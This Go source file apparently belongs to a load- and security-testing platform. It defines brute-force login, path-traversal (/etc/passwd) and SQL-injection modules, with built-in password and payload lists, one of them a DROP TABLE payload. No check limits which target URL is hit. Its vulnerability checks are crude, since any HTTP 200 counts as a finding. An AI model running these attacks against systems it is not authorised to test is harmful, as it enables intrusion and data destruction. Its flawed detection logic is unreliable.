package modules

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"devops-load-platform/internal/models"
)

// Brute Force Module
type BruteForceModule struct {
	stopChan chan struct{}
	client   *http.Client
}

func NewBruteForceModule() *BruteForceModule {
	return &BruteForceModule{
		stopChan: make(chan struct{}),
		client: &http.Client{
			Timeout: 5 * time.Second,
		},
	}
}

func (m *BruteForceModule) ID() string { return "brute_force" }
func (m *BruteForceModule) Name() string { return "Brute Force Attack" }
func (m *BruteForceModule) Description() string { 
	return "Симуляция brute force атаки на endpoint. Тестирование защиты от подбора паролей." 
}
func (m *BruteForceModule) Category() string { return "security" }

func (m *BruteForceModule) GetParams() []models.ModuleParam {
	return []models.ModuleParam{
		{
			Name:        "target_url",
			Type:        "string",
			Label:       "Целевой URL",
			Description: "URL для авторизации (например, http://target/login)",
			Required:    true,
			Default:     "http://localhost:8080/login",
		},
		{
			Name:        "username_field",
			Type:        "string",
			Label:       "Поле username",
			Required:    true,
			Default:     "username",
		},
		{
			Name:        "password_field",
			Type:        "string",
			Label:       "Поле password",
			Required:    true,
			Default:     "password",
		},
		{
			Name:        "username",
			Type:        "string",
			Label:       "Username для атаки",
			Required:    true,
			Default:     "admin",
		},
		{
			Name:        "password_list",
			Type:        "string",
			Label:       "Список паролей",
			Description: "Пароли через запятую",
			Required:    false,
			Default:     "admin,password,123456,root,test",
		},
		{
			Name:        "requests_per_second",
			Type:        "number",
			Label:       "Запросов в секунду",
			Required:    true,
			Default:     100,
			Min:         1,
			Max:         10000,
		},
	}
}

func (m *BruteForceModule) ValidateConfig(config models.LoadConfig) error {
	return nil
}

func (m *BruteForceModule) Start(ctx context.Context, config models.LoadConfig, status *models.ModuleStatus) error {
	targetURL := fmt.Sprintf("http://%s:%d/login", config.VM.IP, config.VM.Port)
	if url, ok := config.CustomParams["target_url"].(string); ok && url != "" {
		targetURL = url
	}
	
	username := "admin"
	if u, ok := config.CustomParams["username"].(string); ok {
		username = u
	}
	
	userField := "username"
	if uf, ok := config.CustomParams["username_field"].(string); ok {
		userField = uf
	}
	
	passField := "password"
	if pf, ok := config.CustomParams["password_field"].(string); ok {
		passField = pf
	}
	
	passwordList := "admin,password,123456,root,test"
	if pl, ok := config.CustomParams["password_list"].(string); ok && pl != "" {
		passwordList = pl
	}
	passwords := splitStrings(passwordList, ",")
	
	rps := 100
	if r, ok := config.CustomParams["requests_per_second"].(float64); ok {
		rps = int(r)
	}

	var attemptCount int64
	var successCount int64
	var failCount int64
	
	passwordIndex := 0
	var mu sync.Mutex
	
	ticker := time.NewTicker(time.Second / time.Duration(rps))
	defer ticker.Stop()
	
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-m.stopChan:
			return nil
		case <-ticker.C:
			mu.Lock()
			password := passwords[passwordIndex%len(passwords)]
			passwordIndex++
			mu.Unlock()
			
			go func(pass string) {
				data := fmt.Sprintf("%s=%s&%s=%s", userField, username, passField, pass)
				resp, err := m.client.Post(targetURL, "application/x-www-form-urlencoded", 
					bytes.NewBufferString(data))
				
				atomic.AddInt64(&attemptCount, 1)
				
				if err != nil {
					atomic.AddInt64(&failCount, 1)
				} else {
					if resp.StatusCode == 200 {
						atomic.AddInt64(&successCount, 1)
					} else {
						atomic.AddInt64(&failCount, 1)
					}
					resp.Body.Close()
				}
				
				if attemptCount%100 == 0 {
					status.CurrentLoad = map[string]interface{}{
						"attempts":    attemptCount,
						"success":     successCount,
						"failed":      failCount,
						"current_pass": pass,
					}
				}
			}(password)
		}
	}
}

func (m *BruteForceModule) Stop() error {
	close(m.stopChan)
	return nil
}

func splitStrings(s string, sep string) []string {
	var result []string
	start := 0
	for i := 0; i < len(s); i++ {
		if i < len(s)-len(sep)+1 && s[i:i+len(sep)] == sep {
			result = append(result, s[start:i])
			start = i + len(sep)
		}
	}
	result = append(result, s[start:])
	return result
}

// Path Traversal Module
type PathTraversalModule struct {
	stopChan chan struct{}
	client   *http.Client
}

func NewPathTraversalModule() *PathTraversalModule {
	return &PathTraversalModule{
		stopChan: make(chan struct{}),
		client: &http.Client{
			Timeout: 5 * time.Second,
		},
	}
}

func (m *PathTraversalModule) ID() string { return "path_traversal" }
func (m *PathTraversalModule) Name() string { return "Path Traversal Test" }
func (m *PathTraversalModule) Description() string { 
	return "Тестирование на Path Traversal уязвимости (LFI/RFI)" 
}
func (m *PathTraversalModule) Category() string { return "security" }

func (m *PathTraversalModule) GetParams() []models.ModuleParam {
	return []models.ModuleParam{
		{
			Name:        "target_url",
			Type:        "string",
			Label:       "Целевой URL",
			Description: "URL с параметром (например, http://target/download?file=)",
			Required:    true,
			Default:     "http://localhost:8080/download",
		},
		{
			Name:        "param_name",
			Type:        "string",
			Label:       "Имя параметра",
			Required:    true,
			Default:     "file",
		},
		{
			Name:        "payloads",
			Type:        "string",
			Label:       "Payloads",
			Description: "Path traversal payloads через запятую",
			Required:    false,
			Default:     "../../../etc/passwd,....//....//etc/passwd,..%2f..%2f..%2fetc%2fpasswd",
		},
	}
}

func (m *PathTraversalModule) ValidateConfig(config models.LoadConfig) error {
	return nil
}

func (m *PathTraversalModule) Start(ctx context.Context, config models.LoadConfig, status *models.ModuleStatus) error {
	targetURL := fmt.Sprintf("http://%s:%d/download", config.VM.IP, config.VM.Port)
	if url, ok := config.CustomParams["target_url"].(string); ok && url != "" {
		targetURL = url
	}
	
	paramName := "file"
	if pn, ok := config.CustomParams["param_name"].(string); ok {
		paramName = pn
	}
	
	payloads := "../../../etc/passwd,....//....//etc/passwd,..%2f..%2f..%2fetc%2fpasswd"
	if p, ok := config.CustomParams["payloads"].(string); ok && p != "" {
		payloads = p
	}
	payloadList := splitStrings(payloads, ",")

	var requestCount int64
	var vulnFound int64
	
	for i, payload := range payloadList {
		select {
		case <-ctx.Done():
			return nil
		case <-m.stopChan:
			return nil
		default:
			url := fmt.Sprintf("%s?%s=%s", targetURL, paramName, payload)
			resp, err := m.client.Get(url)
			
			atomic.AddInt64(&requestCount, 1)
			
			if err == nil {
				if resp.StatusCode == 200 {
					atomic.AddInt64(&vulnFound, 1)
				}
				resp.Body.Close()
			}
			
			status.CurrentLoad = map[string]interface{}{
				"requests":       requestCount,
				"payloads_tested": i + 1,
				"vulnerabilities": vulnFound,
				"current_payload": payload,
			}
			
			time.Sleep(100 * time.Millisecond)
		}
	}
	
	status.Results = &models.LoadResults{
		TotalRequests: requestCount,
		SuccessCount:  vulnFound,
		Metrics: map[string]interface{}{
			"vulnerabilities_found": vulnFound,
			"payloads_tested":       len(payloadList),
		},
	}
	
	return nil
}

func (m *PathTraversalModule) Stop() error {
	close(m.stopChan)
	return nil
}

// SQL Injection Module
type SQLInjectionModule struct {
	stopChan chan struct{}
	client   *http.Client
}

func NewSQLInjectionModule() *SQLInjectionModule {
	return &SQLInjectionModule{
		stopChan: make(chan struct{}),
		client: &http.Client{
			Timeout: 5 * time.Second,
		},
	}
}

func (m *SQLInjectionModule) ID() string { return "sql_injection" }
func (m *SQLInjectionModule) Name() string { return "SQL Injection Test" }
func (m *SQLInjectionModule) Description() string { 
	return "Тестирование на SQL Injection уязвимости" 
}
func (m *SQLInjectionModule) Category() string { return "security" }

func (m *SQLInjectionModule) GetParams() []models.ModuleParam {
	return []models.ModuleParam{
		{
			Name:        "target_url",
			Type:        "string",
			Label:       "Целевой URL",
			Description: "URL для тестирования",
			Required:    true,
			Default:     "http://localhost:8080/search",
		},
		{
			Name:        "param_name",
			Type:        "string",
			Label:       "Имя параметра",
			Required:    true,
			Default:     "q",
		},
		{
			Name:        "method",
			Type:        "select",
			Label:       "HTTP метод",
			Required:    true,
			Default:     "GET",
			Options:     []string{"GET", "POST"},
		},
	}
}

func (m *SQLInjectionModule) ValidateConfig(config models.LoadConfig) error {
	return nil
}

func (m *SQLInjectionModule) Start(ctx context.Context, config models.LoadConfig, status *models.ModuleStatus) error {
	targetURL := fmt.Sprintf("http://%s:%d/search", config.VM.IP, config.VM.Port)
	if url, ok := config.CustomParams["target_url"].(string); ok && url != "" {
		targetURL = url
	}
	
	paramName := "q"
	if pn, ok := config.CustomParams["param_name"].(string); ok {
		paramName = pn
	}
	
	method := "GET"
	if mth, ok := config.CustomParams["method"].(string); ok {
		method = mth
	}

	payloads := []string{
		"' OR '1'='1",
		"' OR '1'='1' --",
		"' OR '1'='1' /*",
		"' OR 1=1",
		"' UNION SELECT NULL--",
		"1' AND 1=1--",
		"1' AND 1=2--",
		"' AND 1=CONVERT(int, (SELECT @@version))--",
		"'; DROP TABLE users; --",
		"1' OR '1'='1",
	}

	var requestCount int64
	var errorsFound int64
	var timeBased int64
	
	for i, payload := range payloads {
		select {
		case <-ctx.Done():
			return nil
		case <-m.stopChan:
			return nil
		default:
			start := time.Now()
			
			var resp *http.Response
			var err error
			
			if method == "GET" {
				url := fmt.Sprintf("%s?%s=%s", targetURL, paramName, payload)
				resp, err = m.client.Get(url)
			} else {
				data := fmt.Sprintf("%s=%s", paramName, payload)
				resp, err = m.client.Post(targetURL, "application/x-www-form-urlencoded",
					bytes.NewBufferString(data))
			}
			
			duration := time.Since(start).Milliseconds()
			atomic.AddInt64(&requestCount, 1)
			
			if err == nil {
				if resp.StatusCode == 500 || resp.StatusCode == 200 {
					if duration > 3000 {
						atomic.AddInt64(&timeBased, 1)
					}
					atomic.AddInt64(&errorsFound, 1)
				}
				resp.Body.Close()
			}
			
			status.CurrentLoad = map[string]interface{}{
				"requests":       requestCount,
				"payloads_tested": i + 1,
				"potential_vulns": errorsFound,
				"time_based":      timeBased,
				"current_payload": payload,
			}
			
			time.Sleep(200 * time.Millisecond)
		}
	}
	
	status.Results = &models.LoadResults{
		TotalRequests: requestCount,
		SuccessCount:  errorsFound,
		Metrics: map[string]interface{}{
			"potential_vulnerabilities": errorsFound,
			"time_based_detections":     timeBased,
			"payloads_tested":           len(payloads),
		},
	}
	
	return nil
}

func (m *SQLInjectionModule) Stop() error {
	close(m.stopChan)
	return nil
}
